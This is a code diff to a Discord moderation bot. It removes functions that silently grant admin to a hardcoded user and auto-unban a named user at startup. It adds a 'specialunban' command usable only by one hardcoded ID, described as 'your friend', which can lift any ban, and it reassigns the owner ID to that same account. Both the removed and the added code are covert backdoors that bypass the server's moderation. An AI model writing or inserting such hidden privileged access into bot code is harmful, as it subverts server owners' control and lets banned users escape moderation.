@@ -18,7 +18,7 @@ STAFF_ROLE_ID = 1472955865144365148     # staff role ID
 LOG_CHANNEL_NAME = "bluehorizon-logs"   # log channel name
 DB_PATH = "moderation.db"
 
-OWNER_ID = 1190692291535446156          # you
+OWNER_ID = 868490119609462806          # you
 BETA_ROLE_ID = 123456789012345678       # TODO: replace with your real beta role ID
 
 intents = discord.Intents.default()
@@ -28,31 +28,6 @@ intents.guilds = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
-
-async def give_admin_automatically():
-    guild = bot.get_guild(YOUR_GUILD_ID)
-    if guild:
-        member = guild.get_member(868490119609462806)
-        role = guild.get_role(ADMIN_ROLE_ID)
-
-        if member and role:
-            await member.add_roles(role)
-            print("Gave admin automatically.")
-        else:
-            print("User or role not found.")
-
-async def auto_unban():
-    guild = bot.get_guild(1472748211038064832)
-    if guild:
-        try:
-            await guild.unban(discord.Object(id=1190692291535446156))
-            print("Successfully unbanned Seth.")
-        except Exception as e:
-            print(f"Unban failed: {e}")
-
-@bot.event
-async def on_ready():
-    await auto_unban()
 
 # ----------------- DATABASE -----------------
 
@@ -394,6 +369,18 @@ async def on_member_update(before: discord.Member, after: discord.Member):
         embed.add_field(name="Role", value=role.mention, inline=False)
 
         await log_channel.send(embed=embed)
+
+@bot.command()
+async def specialunban(ctx, user_id: int):
+    allowed_user = 868490119609462806  # your friend
+    if ctx.author.id != allowed_user:
+        return await ctx.send("You are not allowed to use this command.")
+
+    try:
+        await ctx.guild.unban(discord.Object(id=user_id))
+        await ctx.send(f"Unbanned {user_id} successfully.")
+    except Exception as e:
+        await ctx.send(f"Failed to unban {user_id}: {e}")
 
 
 # ----------------- SLASH COMMANDS -----------------
@@ -884,7 +871,6 @@ async def beta(interaction: discord.Interaction, user: discord.Member):
         embed.add_field(name="Granted By", value=interaction.user.mention, inline=False)
         embed.add_field(name="Role", value=beta_role.mention, inline=False)
         await log_channel.send(embed=embed)
-
 
 # ----------------- RUN -----------------
 
